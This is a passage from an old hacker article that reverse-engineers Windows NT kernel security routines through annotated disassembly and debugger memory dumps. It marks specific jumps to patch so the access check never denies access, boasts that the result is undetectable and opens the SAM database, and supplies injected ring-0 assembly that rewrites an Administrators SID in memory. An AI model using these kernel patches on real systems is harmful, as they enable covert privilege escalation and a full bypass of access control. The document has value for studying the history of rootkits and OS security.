+80199836 var_14		 = dword ptr -14h
+80199836 var_10		 = dword ptr -10h
+80199836 var_C		 = dword ptr -0Ch
+80199836 var_8		 = dword ptr -8
+80199836 var_2		 = byte	ptr -2
+80199836 arg_0		 = dword ptr  8
+80199836 arg_4		 = dword ptr  0Ch
+80199836 arg_8		 = dword ptr  10h
+80199836 arg_C		 = dword ptr  14h
+80199836 arg_10		 = dword ptr  18h
+80199836 arg_16		 = byte	ptr  1Eh
+80199836 arg_17		 = byte	ptr  1Fh
+80199836 arg_18		 = dword ptr  20h
+80199836 arg_1C		 = dword ptr  24h
+80199836 arg_20		 = dword ptr  28h
+80199836 arg_24		 = dword ptr  2Ch
+80199836
+80199836		 push	 ebp
+80199837		 mov	 ebp, esp
+80199839		 sub	 esp, 14h
+8019983C		 push	 ebx
+8019983D		 push	 esi
+8019983E		 push	 edi
+8019983F		 xor	 ebx, ebx
+80199841		 mov	 eax, [ebp+arg_8]	; pulls eax
+80199844		 mov	 [ebp+var_14], ebx	; ebx is zero, looks
+							; like it init's a
+							; bunch of local vars
+80199847		 mov	 [ebp+var_C], ebx
+8019984A		 mov	 [ebp-1], bl
+8019984D		 mov	 [ebp+var_2], bl
+80199850		 cmp	 eax, ebx		; check that arg8 is
+							; NULL
+80199852		 jnz	 short loc_80199857
+80199854		 mov	 eax, [ebp+arg_4]	; arg4 pts to
+							; "USER32  "
+80199857
+80199857 loc_80199857:
+80199857		 mov	 edi, [ebp+arg_C]	; checking some flags
+							; off of this one
+8019985A		 mov	 [ebp+var_8], eax	; var_8 = arg_4
+8019985D		 test	 edi, 1000000h		; obviously flags..
+							; desired access mask
+							; I think...
+
+80199863		 jz	 short loc_801998CA	; normally this jumps..
+							; go ahead and jump
+80199865		 push	 [ebp+arg_18]
+80199868		 push	 [ebp+var_8]
+8019986B		 push	 dword_8014EE94
+80199871		 push	 dword_8014EE90
+80199877		 call	 sub_8019ADE0		; another undoc'd sub
+8019987C		 test	 al, al			; return code
+8019987E		 jnz	 short loc_80199890
+80199880		 mov	 ecx, [ebp+arg_24]
+80199883		 xor	 al, al
+80199885		 mov	 dword ptr [ecx], 0C0000061h
+8019988B		 jmp	 loc_80199C0C
+80199890 ;
+===========================================================================
+		removed source here
+801998CA ;
+===========================================================================
+801998CA
+801998CA loc_801998CA:				 ; jump from above lands here
+801998CA					 ; sub_80199836
+801998CA		 mov	 eax, [ebp+arg_0]	; arg0 pts to a
+							; Security Descriptor
+801998CD		 mov	 dx, [eax+2]		; offset 2 is that
+							; 80 04 number...
+801998D1		 mov	 cx, dx
+801998D4		 and	 cx, 4			; 80 04 become 00 04
+801998D8		 jz	 short loc_801998EA	; normally doesnt jump
+801998DA		 mov	 esi, [eax+10h]		; SD[10h] is an offset
+							; value to the DACL in
+							; the SD
+801998DD		 test	 esi, esi		; make sure it exists
+801998DF		 jz	 short loc_801998EA
+801998E1		 test	 dh, 80h
+801998E4		 jz	 short loc_801998EC
+801998E6		 add	 esi, eax		; FFWDS to first DACL
+							; in SD ******
+801998E8		 jmp	 short loc_801998EC     ; normally all good
+							; here, go ahead and
+							; jump
+801998EA ;
+===========================================================================
+801998EA
+801998EA loc_801998EA:				 ; CODE	XREF: sub_80199836+A2
+801998EA					 ; sub_80199836+A9
+801998EA		 xor	 esi, esi
+801998EC
+801998EC loc_801998EC:				 ; CODE	XREF: sub_80199836+AE
+801998EC					 ; sub_80199836+B2
+801998EC		 cmp	 cx, 4		 ; jump lands here
+801998F0		 jnz	 loc_80199BC6
+801998F6		 test	 esi, esi
+801998F8		 jz	 loc_80199BC6
+801998FE		 test	 edi, 80000h	; we normally dont match this,
+						; so go ahead and jump
+80199904		 jz	 short loc_8019995E
+*** removed source here ***
+8019995E ;
+===========================================================================
+8019995E
+8019995E loc_8019995E:				 ; CODE	XREF: sub_80199836+CE
+8019995E					 ; sub_80199836+D4 ...
+8019995E		 movzx	 eax, word ptr [esi+4]	; jump lands
+80199962		 mov	 [ebp+var_10], eax	; offset 4 is number of
+							; ACE's present in DACL
+							; var_10 = # Ace's
+80199965		 xor	 eax, eax
+80199967		 cmp	 [ebp+var_10], eax
+8019996A		 jnz	 short loc_801999B7	; normally jump
+*** removed source here ***
+801999A2 ;
+===========================================================================
+*** removed source here ***
+801999B7 ;
+===========================================================================
+801999B7
+801999B7 loc_801999B7:				 ; CODE	XREF: sub_80199836+134
+801999B7		 test	 byte ptr [ebp+arg_C+3], 2 ; looks like part of
+							   ; the flags data,
+							   ; we usually jump
+801999BB		 jz	 loc_80199AD3
+*** removed source here ***
+80199AD3 ;
+===========================================================================
+80199AD3
+80199AD3 loc_80199AD3:				 ; CODE	XREF: sub_80199836+185
+80199AD3		 mov	 [ebp+var_C], 0	 ; jump lands here
+80199ADA		 add	 esi, 8
+80199ADD		 cmp	 [ebp+var_10], 0 ; is number of ACE's zero?
+80199AE1		 jz	 loc_80199B79	 ; normally not
+80199AE7
+80199AE7 loc_80199AE7:				 ; CODE	XREF: sub_80199836+33D
+80199AE7		 test	 edi, edi	 ; the EDI register is very 
+						 ; important we will continue 
+						 ; to loop back to this point 
+						 ; as we traverse each ACE
+						 ; the EDI register is modified
+						 ; with each ACE's access mask 
+						 ; if a SID match occurs.  
+						 ; Access is allowed only if 
+						 ; EDI is completely blank
+						 ; by the time we are done. :-)
+
+80199AE9		 jz	 loc_80199B79		; jumps to exit routine
+							; if EDI is blank
+
+80199AEF		 test	 byte ptr [esi+1], 8	; checks for ACE value
+							; 8, second byte..
+							; i dont know what 
+							; this is, but if it's
+							; not 8, its not 
+							; evaluated, not 
+							; important
+80199AF3		 jnz	 short loc_80199B64
+80199AF5		 mov	 al, [esi]		; this is the ACE type,
+							; which is 0, 1, or 4
+80199AF7		 test	 al, al			; 0 is ALLOWED_TYPE and
+							; 1 is DENIED_TYPE
+80199AF9		 jnz	 short loc_80199B14	; jump to next block if
+							; it's not type 0
+80199AFB		 lea	 eax, [esi+8]		; offset 8 is the SID
+80199AFE		 push	 eax			; pushes the ACE
+80199AFF		 push	 [ebp+var_8]
+80199B02		 call	 sub_801997C2		; checks to see if the
+							; caller matches the 
+							; SID return of 1 says
+							; we matched, 0 means 
+							; we did not
+80199B07		 test	 al, al
+80199B09		 jz	 short loc_80199B64	; a match here is good,
+							; since its the ALLOWED
+							; list
+							; so a 2 byte patch can
+							; NOP out this jump 
+							; <PATCH ME>
+80199B0B		 mov	 eax, [esi+4]
+80199B0E		 not	 eax
+80199B10		 and	 edi, eax		; whiddles off the part
+							; of EDI that we 
+							; matched ..
+							; this chopping of 
+							; flags can go on through
+							; many loops
+							; remember, we are only
+							; good if ALL of EDI is
+							; chopped away...
+80199B12		 jmp	 short loc_80199B64
+80199B14 ;
+===========================================================================
+80199B14
+80199B14 loc_80199B14:				 ; CODE	XREF: sub_80199836+2C3
+80199B14		 cmp	 al, 4			; check for ACE type 4
+80199B16		 jnz	 short loc_80199B4B	; normally we aren't 
+							; this type, so jump
+*** removed source here ***
+80199B4B ;
+===========================================================================
+80199B4B
+80199B4B loc_80199B4B:				 ; CODE	XREF: sub_80199836+2E0j
+80199B4B		 cmp	 al, 1			; check for DENIED type
+80199B4D		 jnz	 short loc_80199B64
+80199B4F		 lea	 eax, [esi+8]		; offset 8 is the SID
+80199B52		 push	 eax
+80199B53		 push	 [ebp+var_8]
+80199B56		 call	 sub_801997C2		; check the callers SID
+80199B5B		 test	 al, al			; a match here is BAD, 
+							; since we are being 
+							; DENIED
+80199B5D		 jz	 short loc_80199B64	; so make JZ a normal 
+							; JMP <PATCH ME>
+
+80199B5F		 test	 [esi+4], edi		; we avoid this flag 
+							; check w/ the patch
+80199B62		 jnz	 short loc_80199B79
+80199B64
+80199B64 loc_80199B64:				 ; CODE	XREF: sub_80199836+2BD
+80199B64					 ; sub_80199836+2D3
+80199B64		 mov	 ecx, [ebp+var_10]	; our loop routine, 
+							; called from above as
+							; we loop around and 
+							; around.
+							; var_10 is the number
+							; of ACE's
+80199B67		 inc	 [ebp+var_C]		; var_C is the current 
+							; ACE
+80199B6A		 movzx	 eax, word ptr [esi+2]	; byte 3 is the offset
+							; to the next ACE
+80199B6E		 add	 esi, eax		; FFWD
+80199B70		 cmp	 [ebp+var_C], ecx	; check to see if we 
+							; are done
+80199B73		 jb	 loc_80199AE7		; if not, go back up...
+80199B79
+80199B79 loc_80199B79:				 ; CODE	XREF: sub_80199836+2AB
+80199B79					 ; sub_80199836+2B3
+80199B79		 xor	 eax, eax		; this is our general 
+							; exit routine
+80199B7B		 test	 edi, edi		; if EDI isnt empty, 
+							; then a DENIED state 
+							; was reached above
+80199B7D		 jz	 short loc_80199B91	; so patch the JZ into
+							; a JMP so we never 
+							; return ACCESS_DENIED 
+							; <PATCH ME>
+80199B7F		 mov	 ecx, [ebp+arg_1C]
+80199B82		 mov	 [ecx],	eax
+80199B84		 mov	 eax, [ebp+arg_24]
+				 ; STATUS_ACCESS_DENIED
+80199B87		 mov	 dword ptr [eax], 0C0000022h	
+80199B8D		 xor	 al, al
+80199B8F		 jmp	 short loc_80199C0C
+80199B91 ;
+===========================================================================
+80199B91
+80199B91 loc_80199B91:				 ; CODE	XREF: sub_80199836+347
+80199B91		 mov	 eax, [ebp+1Ch]
+80199B94		 mov	 ecx, [ebp+arg_1C]	; result code into 
+							; &arg_1C
+80199B97		 or	 eax, [ebp+arg_C]	; checked passed in 
+							; mask
+80199B9A		 mov	 [ecx],	eax
+80199B9C		 mov	 ecx, [ebp+arg_24]	; result code into 
+							; &arg_24, should be 
+							; zero
+80199B9F		 jnz	 short loc_80199BAB	; if everything above 
+							; went OK, we should
+jump
+80199BA1		 xor	 al, al
+80199BA3		 mov	 dword ptr [ecx], 0C0000022h
+80199BA9		 jmp	 short loc_80199C0C
+80199BAB ;
+===========================================================================
+80199BAB
+80199BAB loc_80199BAB:				 ; CODE	XREF: sub_80199836+369
+80199BAB		 mov	 dword ptr [ecx], 0	; Good and Happy 
+							; things, we passed!
+80199BB1		 test	 ebx, ebx
+80199BB3		 jz	 short loc_80199C0A
+80199BB5		 push	 [ebp+arg_20]
+80199BB8		 push	 dword ptr [ebp+var_2]
+80199BBB		 push	 dword ptr [ebp-1]
+80199BBE		 push	 ebx
+80199BBF		 call	 sub_8019DC80
+80199BC4		 jmp	 short loc_80199C0A
+80199BC6 ;
+===========================================================================
+	    removed code here
+80199C0A loc_80199C0A:				 ; CODE	XREF: sub_80199836+123
+80199C0A					 ; sub_80199836+152
+80199C0A		 mov	 al, 1
+80199C0C
+80199C0C loc_80199C0C:				 ; CODE	XREF: sub_80199836+55
+80199C0C					 ; sub_80199836+8F
+80199C0C		 pop	 edi
+80199C0D		 pop	 esi
+80199C0E		 pop	 ebx
+80199C0F		 mov	 esp, ebp
+80199C11		 pop	 ebp
+80199C12		 retn	 28h		 ; Outta Here!
+80199C12 sub_80199836	 endp
+
+Whew!
+
+Some STRUCTURE dumps along the way:
+
+:d eax
+0023:E1A1C174 01 00 04 80 DC 00 00 00-EC 00 00 00 00 00 00 00  ................
+; this looks like a SD
+0023:E1A1C184 14 00 00 00 02 00 C8 00-08 00 00 00 00 09 18 00  ................
+0023:E1A1C194 00 00 00 10 01 01 00 00-00 00 00 03 00 00 00 00  ................
+0023:E1A1C1A4 00 00 00 00 00 02 18 00-FF 01 1F 00 01 01 00 00  ................
+0023:E1A1C1B4 00 00 00 03 00 00 00 00-00 00 00 00 00 09 18 00  ................
+0023:E1A1C1C4 00 00 00 10 01 01 00 00-00 00 00 05 12 00 00 00  ................
+0023:E1A1C1D4 00 00 00 00 00 02 18 00-FF 01 1F 00 01 01 00 00  ................
+0023:E1A1C1E4 00 00 00 05 12 00 00 00-00 00 00 00 00 09 18 00  ................
+
+:d esi
+0023:E1A1C188 02 00 C8 00 08 00 00 00-00 09 18 00 00 00 00 10  ................
+; OFFSET into the SD (DACL)
+0023:E1A1C198 01 01 00 00 00 00 00 03-00 00 00 00 00 00 00 00  ................
+0023:E1A1C1A8 00 02 18 00 FF 01 1F 00-01 01 00 00 00 00 00 03  ................
+0023:E1A1C1B8 00 00 00 00 00 00 00 00-00 09 18 00 00 00 00 10  ................
+0023:E1A1C1C8 01 01 00 00 00 00 00 05-12 00 00 00 00 00 00 00  ................
+0023:E1A1C1D8 00 02 18 00 FF 01 1F 00-01 01 00 00 00 00 00 05  ................
+0023:E1A1C1E8 12 00 00 00 00 00 00 00-00 09 18 00 00 00 00 10  ................
+0023:E1A1C1F8 01 02 00 00 00 00 00 05-20 00 00 00 20 02 00 00  ........ ... ...
+
+
+The following formats appear to be the SD, DACL, and ACE:
+
+SD:
+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
+r |  |04|80|fo|  |  |  |fg|  |  |  |  |  |  |fd|  |  --==>
+-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
+r: Revision, must be 1
+fo: Offset to Owner SID
+fg: Offset to Group SID
+fd: Offset to DACL
+
+ACL:
+-- -- -- -- -- -- -- -- -- --
+r |  |  |  |na|  |  |  |sa|  |  --==>
+-- -- -- -- -- -- -- -- -- --
+r: Revision?
+na: Number of ACE's
+sa: Start of first ACE
+
+ACE:
+-- -- -- -- -- -- -- -- -- --
+t |i |oa|  |am|  |  |  |ss|  |  --==>
+-- -- -- -- -- -- -- -- -- --
+t: type, 0, 1, or 4
+i: the ACE is ignored if this value isn't 8
+oa: offset to next ACE
+am: access mask associated with this SID
+ss: start of the SID, normally at offset 8, but for ACE type 4, will be at
+    offset 0Ch
+
+So there you have it, a 4 byte patch.  Application of this patch will allow
+almost anyone access to almost any object on your NT domain.  Also, it is
+undetectable when auditing ACL's and the such.  The only indication something
+is wrong is the fact your now opening the SAM database from a normal account 
+w/o a hitch... I can kill any process without being denied access.. God knows 
+what the NULL User session can get away with!.  I like that.  8-/.  Gee, it's 
+almost USEFUL isn't it?
+
+
+Reverse Engineering & Patch of the RTLGetOwnerSecurityDescriptor() function
+---------------------------------------------------------------------------
+
+As if the last patch wasn't good enough, this patch should illustrate how easy
+it is add your own code to the Kernel.  Simply by patching a single jump, I 
+was able to detour the execution path into a highwayman's patch, and return 
+back to normal execution without a hitch.  This patch alters a SID in memory, 
+violating the integrity of the security system.  With a little creative light,
+this patch could be so much more.  There are hundreds of routines in the 
+ntoskrnl.exe. You are executing your own code in ring-0, so anything is 
+possible.  If for any other reason, this paper should open your mind to the 
+possibilities.  Reversing the NT Kernel is nothing new, I am quite sure.  
+I would bet that the NSA has the full source to the NT Kernel, and has written
+some very elaborate patches.  In fact, they were probably on that for NT 3.5.
+
+80184AAC ;
+===========================================================================
+80184AAF		 align 4
+80184AB0 ; Exported entry 719. RtlGetOwnerSecurityDescriptor
+80184AB0
+80184AB0 ;
+===========================================================================
+80184AB0
+80184AB0 ;		 S u b r o u t i n e
+80184AB0 ; Attributes: bp-based	frame
+80184AB0
+80184AB0		 public	RtlGetOwnerSecurityDescriptor
+80184AB0 RtlGetOwnerSecurityDescriptor proc near ; CODE	XREF: sub_8018F318+22
+80184AB0
+80184AB0 arg_0		 = dword ptr  8
+80184AB0 arg_4		 = dword ptr  0Ch
+80184AB0 arg_8		 = dword ptr  10h
+80184AB0
+80184AB0		 push	 ebp
+80184AB1		 mov	 edx, [esp+arg_0]
+80184AB5		 mov	 ebp, esp
+80184AB7		 push	 esi
+
+//
+// MessageId: STATUS_UNKNOWN_REVISION
+//
+// MessageText:
+//
+//  Indicates a revision number encountered or specified is not one
+//  known by the service.  It may be a more recent revision than the
+//  service is aware of.
+//
+#define STATUS_UNKNOWN_REVISION          ((NTSTATUS)0xC0000058L)
+
+On SD Revision:
+The user mode function InitializeSecurityDescriptor() will set the revision
+number for the SD. The InitializeSecurityDescriptor() function initializes a 
+new security descriptor.
+
+BOOL InitializeSecurityDescriptor(
+PSECURITY_DESCRIPTOR pSecurityDescriptor,  // address of security descriptor
+DWORD dwRevision  // revision level
+);
+
+Parameters:
+pSecurityDescriptor: Points to a SECURITY_DESCRIPTOR structure that the
+function initializes.
+
+dwRevision: Specifies the revision level to assign to the security descriptor.
+This must be SECURITY_DESCRIPTOR_REVISION.
+
+80184AB8		 cmp	 byte ptr [edx], 1	; Ptr to decimal 
+							; value usually 01, 
+							; (SD Revision)
+80184ABB		 jz	 short loc_80184AC4
+				 ; STATUS CODE (STATUS_UNKNOWN_REVISION)
+80184ABD		 mov	 eax, 0C0000058h	
+80184AC2		 jmp	 short loc_80184AF3	; will exit
+
+The next block here does some operations against the object stored *edx, which
+is our first argument to this function.  I think this may be a SD.  There are
+two different forms of an SD, absolute and relative.. here is the doc:
+
+A security descriptor can be in absolute or self-relative form. In
+self-relative form, all members of the structure are located contiguously 
+in memory. In absolute form, the structure only contains pointers to the 
+members.
+
+This [edx] object is passed in as absolute:
+
+Argument 1 (a SECURITY_DESCRIPTOR structure):
+:d edx
+0023:E1F47488 01 00 04 80 5C 00 00 00-6C 00 00 00 00 00 00 00  ....\...l.......
+; 01 Revision, Flags 04,
+; Offset to Owner SID is 5C,
+; Offset to Primary Group SID is 6C
+
+0023:E1F47498 14 00 00 00 02 00 48 00-02 00 00 00 00 00 18 00  ......H.........
+0023:E1F474A8 FF 00 0F 00 01 02 00 00-00 00 00 05 20 00 00 00  ............ ...
+0023:E1F474B8 20 02 00 00 00 00 14 00-FF 00 0F 00 01 01 00 00   ...............
+0023:E1F474C8 00 00 00 05 12 00 00 00-00 00 4E 00 C8 FD 14 00  ..........N.....
+0023:E1F474D8 E8 00 14 00 41 00 64 00-6D 00 69 00 01 02 00 00  ....A.d.m.i.....
+; SIDS start here, see below
+0023:E1F474E8 00 00 00 05 20 00 00 00-20 02 00 00 01 05 00 00  .... ... .......
+0023:E1F474F8 00 00 00 05 15 00 00 00-BA 5D FF 0C 5C 4F CF 51  .........]..\O.Q
+
+80184AC4 ;
+===========================================================================
+80184AC4
+80184AC4 loc_80184AC4:			; CODE	XREF: 
+					; RtlGetOwnerSecurityDescriptor+B
+80184AC4		 mov	 eax, [edx+4]    ; we are here if the revision
+						 ; is good
+80184AC7		 xor	 ecx, ecx
+80184AC9		 test	 eax, eax	 ; 01 00 04 80 >5C< which is 
+						 ; [edx+4] must not be zero
+						 ; if the value IS zero, this 
+						 ; means the SD does NOT have a
+						 ; owner, and it sets argument
+						 ; 2 to NULL, then returns, 
+						 ; ignoring argument 3 
+						 ; altogether.
+80184ACB		 jnz	 short loc_80184AD4
+80184ACD		 mov	 esi, [ebp+arg_4]
+80184AD0		 mov	 [esi],	ecx
+80184AD2		 jmp	 short loc_80184AE1
+80184AD4 ;
+===========================================================================
+80184AD4
+80184AD4 loc_80184AD4:			; CODE	XREF: 
+					; RtlGetOwnerSecurityDescriptor+1B
+80184AD4		 test	 byte ptr [edx+3], 80h   ; 01 00 04 >80< 5C 
+							 ; which is [edx+3]
+must be 80
+80184AD8		 jz	 short loc_80184ADC
+80184ADA		 add	 eax, edx		 ; adds edx to 5C, 
+							 ; which must be an 
+							 ; offset to the SID
+							 ; within the SD
+
+Note a couple of SIDS hanging around in this memory location.  The first one is
+the Owner, the second one must be the Group.  The first SID, 1-5-20-220 is
+BUILTIN\Administrators.  By changing the 220 to a 222, we can alter this to be
+BUILTIN\Guests.  This will cause serious security problems.  That second SID
+happens to be long nasty one.. that is your first indication that it's NOT a
+built-in group.  In fact, in this case, the group is ANSUZ\None, a local group
+on my NT Server (my server is obviously named ANSUZ.. ;)
+
+:d eax
+0023:E1A49F84 01 02 00 00 00 00 00 05-20 00 00 00 20 02 00 00  ........ ... ...
+; This is a SID in memory (1-5-20-220)
+0023:E1A49F94 01 05 00 00 00 00 00 05-15 00 00 00 BA 5D FF 0C  .............]..
+; another SID
+0023:E1A49FA4 5C 4F CF 51 FD 28 9A 4E-01 02					
+; (1-5-15-CFF5DBA-51CF4F5C-4E9A28FD-201)
+
+Here we start working with arguments 1 & 2:
+80184ADC
+80184ADC loc_80184ADC:		 ; CODE	XREF: 
+				 ; RtlGetOwnerSecurityDescriptor+28
+80184ADC		 mov	 esi, [ebp+arg_4]
+80184ADF		 mov	 [esi],	eax	 ; moving the address of the 
+						 ; SID through the user
+						 ; supplied ptr (PSID pOwner)
+80184AE1
+80184AE1 loc_80184AE1:		 ; CODE	XREF: 
+				 ; RtlGetOwnerSecurityDescriptor+22
+80184AE1		 mov	 ax, [edx+2]	 ; some sort of flags 
+						 ; 01 00 >04< 80 5C
+80184AE5		 mov	 edx, [ebp+arg_8]; argument 3, which is to be 
+						 ; filled in with
+flags data
+80184AE8		 and	 al, 1
+80184AEA		 cmp	 al, 1		 ; checking against a mask of 
+						 ; 0x01
+80184AEC		 setz	 cl		 ; set based on flags register
+						 ; (if previous compare was
+true)
+80184AEF		 xor	 eax, eax	 ; status is zero, all good ;)
+80184AF1		 mov	 [edx],	cl	 ; the value is set for 
+						 ; SE_OWNER_DEFAULTED 
+						 ; true/false
+80184AF3
+80184AF3 loc_80184AF3:		 ; CODE	XREF: 
+				 ; RtlGetOwnerSecurityDescriptor+12
+80184AF3		 pop	 esi
+80184AF4		 pop	 ebp
+80184AF5		 retn	 0Ch		 ; outta here, status in EAX
+80184AF5 RtlGetOwnerSecurityDescriptor endp
+
+
+This routine is called from the following stack(s):
+
+(NtOpenProcessToken)
+Break due to BPX ntoskrnl!RtlGetOwnerSecurityDescriptor  (ET=31.98
+milliseconds)
+:stack at 001B:00000000 (SS:EBP 0010:00000000)
+ntoskrnl!KiReleaseSpinLock+09C4 at 0008:8013CC94 (SS:EBP 0010:F8E3FF04)
+ntoskrnl!NtOpenProcessToken+025E at 0008:80198834 (SS:EBP 0010:F8E3FEEC)
+ntoskrnl!ObInsertObject+026F at 0008:8018CDD5 (SS:EBP 0010:F8E3FE50)
+ntoskrnl!ObAssignSecurity+0059 at 0008:801342A3 (SS:EBP 0010:F8E3FD80)
+ntoskrnl!SeSinglePrivilegeCheck+018F at 0008:8019E80F (SS:EBP 0010:F8E3FD48)
+ntoskrnl!ObCheckCreateObjectAccess+0149 at 0008:801340E1 (SS:EBP 0010:F8E3FD34)
+ntoskrnl!ObQueryObjectAuditingByHandle+1BFB at 0008:8018F413 (SS:EBP
+0010:F8E3FD20)
+=> ntoskrnl!RtlGetOwnerSecurityDescriptor at 0008:80184AB0 (SS:EBP
+0010:F8E3FD00)
+
+(PsCreateWin32Process)
+Break due to BPX ntoskrnl!RtlGetOwnerSecurityDescriptor  (ET=3.62 milliseconds)
+:stack
+ntoskrnl!KiReleaseSpinLock+09C4 at 0008:8013CC94 (SS:EBP 0010:F8CDFF04)
+ntoskrnl!PsCreateWin32Process+01E7 at 0008:80192B5D (SS:EBP 0010:F8CDFEDC)
+ntoskrnl!PsCreateSystemThread+04CE at 0008:8019303E (SS:EBP 0010:F8CDFE6C)
+ntoskrnl!ObInsertObject+026F at 0008:8018CDD5 (SS:EBP 0010:F8CDFDC8)
+ntoskrnl!ObAssignSecurity+0059 at 0008:801342A3 (SS:EBP 0010:F8CDFCF8)
+ntoskrnl!SeSinglePrivilegeCheck+018F at 0008:8019E80F (SS:EBP 0010:F8CDFCC0)
+ntoskrnl!ObCheckCreateObjectAccess+0149 at 0008:801340E1 (SS:EBP 0010:F8CDFCAC)
+ntoskrnl!ObQueryObjectAuditingByHandle+1BFB at 0008:8018F413 (SS:EBP
+0010:F8CDFC98)
+=> ntoskrnl!RtlGetOwnerSecurityDescriptor at 0008:80184AB0 (SS:EBP
+0010:F8CDFC78)
+
+(PsCreateSystemThread)
+:stack
+ntoskrnl!KiReleaseSpinLock+09C4 at 0008:8013CC94 (SS:EBP 0010:F8CDFF04)
+ntoskrnl!PsCreateSystemThread+0731 at 0008:801932A1 (SS:EBP 0010:F8CDFEDC)
+ntoskrnl!PsCreateSystemProcess+05FD at 0008:801938B1 (SS:EBP 0010:F8CDFE8C)
+ntoskrnl!ObInsertObject+026F at 0008:8018CDD5 (SS:EBP 0010:F8CDFDEC)
+ntoskrnl!ObAssignSecurity+0059 at 0008:801342A3 (SS:EBP 0010:F8CDFD1C)
+ntoskrnl!SeSinglePrivilegeCheck+018F at 0008:8019E80F (SS:EBP 0010:F8CDFCE4)
+ntoskrnl!ObCheckCreateObjectAccess+0149 at 0008:801340E1 (SS:EBP 0010:F8CDFCD0)
+ntoskrnl!ObQueryObjectAuditingByHandle+1BFB at 0008:8018F413 (SS:EBP
+0010:F8CDFCBC)
+=> ntoskrnl!RtlGetOwnerSecurityDescriptor at 0008:80184AB0 (SS:EBP
+0010:F8CDFC9C)
+
+(SeTokenImpersonationLevel)
+:stack
+ntoskrnl!KiReleaseSpinLock+09C4 at 0008:8013CC94 (SS:EBP 0010:F8CDFF04)
+ntoskrnl!PsCreateSystemThread+0731 at 0008:801932A1 (SS:EBP 0010:F8CDFEDC)
+ntoskrnl!PsRevertToSelf+0063 at 0008:8013577D (SS:EBP 0010:F8CDFE8C)
+ntoskrnl!SeTokenImpersonationLevel+01A3 at 0008:8019F12F (SS:EBP 0010:F8CDFDE8)
+ntoskrnl!ObInsertObject+026F at 0008:8018CDD5 (SS:EBP 0010:F8CDFD9C)
+ntoskrnl!ObAssignSecurity+0059 at 0008:801342A3 (SS:EBP 0010:F8CDFCCC)
+ntoskrnl!SeSinglePrivilegeCheck+018F at 0008:8019E80F (SS:EBP 0010:F8CDFC94)
+ntoskrnl!ObCheckCreateObjectAccess+0149 at 0008:801340E1 (SS:EBP 0010:F8CDFC80)
+ntoskrnl!ObQueryObjectAuditingByHandle+1BFB at 0008:8018F413 (SS:EBP
+0010:F8CDFC6C)
+=> ntoskrnl!RtlGetOwnerSecurityDescriptor at 0008:80184AB0 (SS:EBP
+0010:F8CDFC4C)
+
+
+I began by trying to patch this call.  I decided to try and detect the Owner
+SID of BUILTIN\Administrators (1-5-20-220) and change it to BUILTIN\Users
+(1-5-20-221) on the fly.  The following code is what I patched in:
+
+First, I located a region of memory where I could dump some extra code.  For
+testing, I chose the region at 08:8000F2B0.  I found it to be initially all
+zeroed out, so I figured it safe for a while. Next, I assembled some
+instructions into this new area:
+
+8000F2B0:	push ebx
+		mov ebx, [eax + 08]
+		cmp ebx, 20		  	; check the 20 in 1-5-20-XXX
+		nop				; nop's are leftovers from 
+						; debugging
+		nop
+		jnz 8000f2c2			; skip it if we aren't looking 
+						; at a 20
+		mov word ptr [eax+0c], 221	; write over old RID w/ new RID
+						; of 221
+		nop
+8000f2c2:	pop ebx
+		nop
+		mov esi, [ebp + 0c]		; the two instructions
+		mov [esi], eax			; that I nuked to make the 
+						; initial jump
+		jmp 80184ae1
+
+Now, notice the last two instructions prior to the jump back to NT.  To make
+this call, I had to install a JMP instruction into the NT subroutine itself.
+Doing that nuked two actual instructions, as follows:
+
+Original code:
+
+80184ADC		 mov	 esi, [ebp+arg_4];<**===--- PATCHING A JUMP 
+						 ;          HERE
+80184ADF		 mov	 [esi],	eax
+80184AE1		 mov	 ax, [edx+2]	 ; some sort of flags 
+						 ; 01 00 >04< 80 5C
+80184AE5		 mov	 edx, [ebp+arg_8]; argument 3, which is to be 
+						 ; filled in with flags data
+
+After patch:
+
+80184ADC		 JMP 8000F2B0		 ; Note: this nuked two real 
+						 ; instructions...
+
+80184AE1		 mov	 ax, [edx+2]	 ; some sort of flags 
+						 ; 01 00 >04< 80 5C
+
+80184AE5		 mov	 edx, [ebp+arg_8]; argument 3, which is to be 
+						 ; filled in with flags data
+
+So, to correct this, the code that I am jumping to runs the two missing
+instructions:
+
+		mov esi, [ebp + 0c]		; the two instructions
+		mov [esi], eax			; that I nuked to make the 
+						; initial jump
+
+Alas, all is good.  I tested this patch for quite some time without a problem.
+To verify that it was working, I checked the memory during the patch, and sure
+enough, it was turning SID 1-5-20-220 into SID 1-5-20-221.  However, as with
+all projects, I was not out of the water yet.  When getting the security 
+properties for a file, the Owner still shows up as Administrators.  This patch
+is clearly called during such a query, as I have set breakpoints.  However, 
+the displayed OWNER is still administrators, even though I am patching the 
+SID in memory. Further investigation has revealed that this routine isn't 
+called to check access to a file object, but is called for opening process 
+tokens, creating processes, and creating threads.  Perhaps someone could shed
+some more light on this? Nonetheless, the methods used in this patch can be 
+re-purposed for almost any Kernel routine, so I hope it has been a useful 
+journey.  
+
+
+Appendix A: Exported functions for the SRM:
+-------------------------------------------
+
+SeAccessCheck
+SeAppendPrivileges
+SeAssignSecurity
+SeAuditingFileEvents
+SeAuditingFileOrGlobalEvents
+SeCaptureSecurityDescriptor
+SeCaptureSubjectContext
+SeCloseObjectAuditAlarm
+SeCreateAccessState
+SeCreateClientSecurity
+SeDeassignSecurity
+SeDeleteAccessState
+SeDeleteObjectAuditAlarm
+SeExports
+SeFreePrivileges
+SeImpersonateClient
+SeLockSubjectContext
+SeMarkLogonSessionForTerminationNotification
+SeOpenObjectAuditAlarm
+SeOpenObjectForDeleteAuditAlarm
+SePrivilegeCheck
+SePrivilegeObjectAuditAlarm
+SePublicDefaultDacl
+SeQueryAuthenticationIdToken
+SeQuerySecurityDescriptorInfo
+SeRegisterLogonSessionTerminatedRoutine
+SeReleaseSecurityDescriptor
+SeReleaseSubjectContext
+SeSetAccessStateGenericMapping
+SeSetSecurityDescriptorInfo
+SeSinglePrivilegeCheck
+SeSystemDefaultDacl
+SeTokenImpersonationLevel
+SeTokenType
+SeUnlockSubjectContext
+SeUnregisterLogonSessionTerminatedRoutine
+SeValidSecurityDescriptor
+
+Here are the exported functions for the Object Manager:
+ObAssignSecurity
+ObCheckCreateObjectAccess
+ObCheckObjectAccess
+ObCreateObject
+ObDereferenceObject
+ObfDereferenceObject
+ObFindHandleForObject
+ObfReferenceObject
+ObGetObjectPointerCount
+ObGetObjectSecurity
+ObInsertObject
+ObMakeTemporaryObject
+ObOpenObjectByName
+ObOpenObjectByPointer
+ObQueryNameString
